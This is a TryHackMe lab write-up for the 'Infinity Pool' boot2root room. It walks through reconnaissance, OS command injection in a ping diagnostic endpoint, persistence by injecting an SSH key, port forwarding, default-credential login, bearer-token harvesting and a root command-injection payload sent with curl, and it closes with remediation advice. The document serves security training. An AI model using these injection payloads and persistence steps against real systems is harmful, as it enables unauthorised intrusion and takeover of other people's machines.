# 🏊 TryHackMe Writeup: Infinity Pool

**Room Link:** [Infinity Pool](https://tryhackme.com/room/hh-infinitypool-5b3548af)  
**Difficulty:** Medium  
**Category:** Boot2Root, Web, Network  
**Tags:** `Command Injection`, `Port Forwarding`, `Credential Harvesting`, `API Exploitation`

---

## 📖 1. Executive Summary

The **Infinity Pool** room presents a medium-difficulty Boot2Root challenge themed around a hotel's internal management systems. The engagement starts with external reconnaissance, leading to the discovery of an exposed network diagnostic utility that suffers from a severe OS Command Injection vulnerability. 

Exploiting this flaw provides initial access to the system. Subsequent post-exploitation efforts reveal internal services restricted to localhost—specifically an operations console (Watchtower/FreePBX) and an automation service running as root. By harvesting leaked credentials and an authorization token (Bearer token) from the FreePBX dashboard, a second command injection vulnerability is exploited to achieve full root privileges.

---

## 🔍 2. Reconnaissance and Enumeration

### Port Scanning
Our first step is to identify exposed services on the target machine. We use Nmap to perform a comprehensive scan of all 65,535 TCP ports, along with service version detection.

```bash
nmap -sV -sC -p- 10.113.184.65 -oN nmap_scan.txt
```

**Nmap Output Summary:**
```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
|_http-server-header: gunicorn
| http-robots.txt: 2 disallowed entries 
|_/internal/ /status
|_http-title: Byte Lotus &mdash; Stay Noticed
```

The scan reveals two active services:
- **Port 22 (SSH):** Standard secure shell access. We'll need credentials or a key to use this.
- **Port 80 (HTTP):** A web application powered by Gunicorn.

Crucially, the Nmap script engine parsed the `robots.txt` file and found two restricted endpoints: `/internal/` and `/status`.

![Robots.txt output](assets/robots_txt.png)
*(Screenshot: Discovering the hidden endpoints in robots.txt)*

---

## 🔓 3. Vulnerability Identification & Initial Access

### Analyzing the Web Application
Navigating to the `/status` endpoint reveals a "Sister-property connectivity" network diagnostic tool. The application prompts the user for an IP address to execute a `ping` command. 

![Ping Diagnostic Tool](assets/ping_tool.png)
*(Screenshot: The network diagnostic web interface)*

When we submit an IP, it sends a `POST` request to `/internal/netcheck` with a `host` parameter. Network diagnostic tools that parse user input directly into system shell commands (like `ping <user_input>`) are historically prone to **OS Command Injection** if proper sanitization is absent.

### Exploiting Command Injection
By intercepting the HTTP request via a local proxy (like Burp Suite), we can manipulate the `host` parameter to include shell metacharacters (such as `;`), allowing us to append and execute arbitrary commands.

**Proof of Concept (whoami):**
```http
POST /internal/netcheck HTTP/1.1
Host: 10.113.184.65
Content-Type: application/x-www-form-urlencoded

host=127.0.0.1; whoami
```
The response returns `web`, confirming the command was executed in the context of a low-privileged service account.

### Establishing Persistence and Retrieving User Flag
Running commands blindly via HTTP is inefficient. To upgrade to a stable, interactive SSH session, we can use the command injection to append our own public SSH key to the `web` user's `authorized_keys` file.

**Step 1: Generate an SSH Keypair (on your Kali machine)**
```bash
ssh-keygen -t rsa -f infinity_pool_key
cat infinity_pool_key.pub
```

**Step 2: Inject the Public Key**
Using Burp Suite's Repeater, we inject the `echo` command to append the key:
```http
POST /internal/netcheck HTTP/1.1
Host: 10.113.184.65
Content-Type: application/x-www-form-urlencoded

host=127.0.0.1; echo 'ssh-rsa AAAAB3NzaC1... [YOUR_PUB_KEY] ... attacker@kali' >> ~/.ssh/authorized_keys
```

**Step 3: SSH Login**
With the key successfully injected, we can establish a stable SSH connection:
```bash
ssh -i infinity_pool_key web@10.113.184.65
```

Once logged in, we secure the first objective!

**User Flag:**
```bash
web@infinity-pool:~$ cat user.txt
THM{REDACTED_BY_AUTHOR}
```
*(Note: Flag is censored to comply with TryHackMe writeup guidelines.)*

![User Flag Capture](assets/user_flag.png)
*(Screenshot: Successfully retrieving the user flag via SSH)*

---

## 🚀 4. Privilege Escalation (Root)

### Internal Network Discovery
With interactive access secured, our next goal is lateral movement or privilege escalation. We perform local network enumeration to see if any services are running internally (bound to the loopback interface `127.0.0.1`).

```bash
ss -tln
```
This reveals active listeners on **Port 3000** and **Port 9000**. Because these are listening on localhost, they cannot be accessed directly from our Kali machine over the internet.

### SSH Local Port Forwarding
To interact with these services using our local web browser, we utilize SSH local port forwarding to tunnel the traffic.

```bash
ssh -L 3000:127.0.0.1:3000 -L 9000:127.0.0.1:9000 -i infinity_pool_key web@10.113.184.65
```

Now, visiting `http://localhost:3000` in our Kali browser will seamlessly route to port 3000 on the target machine.

### Credential Harvesting & Token Leakage (Port 3000)
Navigating to `http://localhost:3000` presents an internal "Watchtower" operations console. Enumeration of this login page yields default/unrotated credentials for a FreePBX User Control Panel (UCP).

**Credentials Used:** `admin:admin` (or other standard FreePBX defaults).

![FreePBX Login](assets/freepbx_login.png)
*(Screenshot: Logging into the internal FreePBX UCP)*

Following successful authentication, we inspect the dashboard's network traffic using our browser's Developer Tools (F12 -> Network tab). By analyzing the API requests made by the voicemail widget, we uncover a leaked **Automation Key**. This key functions as a Bearer token (JWT) for internal API authorization.

### Exploiting the Automation Service (Port 9000)
Port 9000 hosts the internal Automation Service, which operates with `root` privileges. Access to its endpoints strictly requires the Bearer token we just discovered.

Reviewing the API structure reveals the `/jobs/export` endpoint, which accepts a `report` parameter. Similar to our initial entry vector, this endpoint fails to sanitize input before passing it to a system shell. 

Using the extracted token, we construct a final command injection payload to execute commands as root and retrieve the final flag.

**Final Exploit Payload:**
```bash
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1...[TRUNCATED_TOKEN]..." \
     -X POST http://127.0.0.1:9000/jobs/export \
     -d 'report=1; cat /root/root.txt'
```

**Root Flag:**
```text
THM{REDACTED_BY_AUTHOR}
```
*(Note: The root flag value is intentionally redacted.)*

![Root Flag Capture](assets/root_flag.png)
*(Screenshot: Executing the curl command and retrieving the root flag)*

---

## 🛡️ 5. Remediation & Key Takeaways

1.  **Input Sanitization:** OS Command Injection is a fatal flaw. Developers should avoid passing user input directly to system shells. If absolutely necessary, input must be strictly whitelisted and sanitized. Using built-in libraries (like native ping functions) rather than OS calls is always preferred.
2.  **Principle of Least Privilege:** The automation service on port 9000 ran as `root`. Even internal services should run with the minimum permissions required to perform their task. If it doesn't strictly need root, don't run it as root.
3.  **Default Credentials & Leaked Tokens:** Default credentials on internal portals (like FreePBX) are a major risk. Additionally, exposing Bearer tokens in UI widgets allows attackers to pivot and exploit adjacent API services.
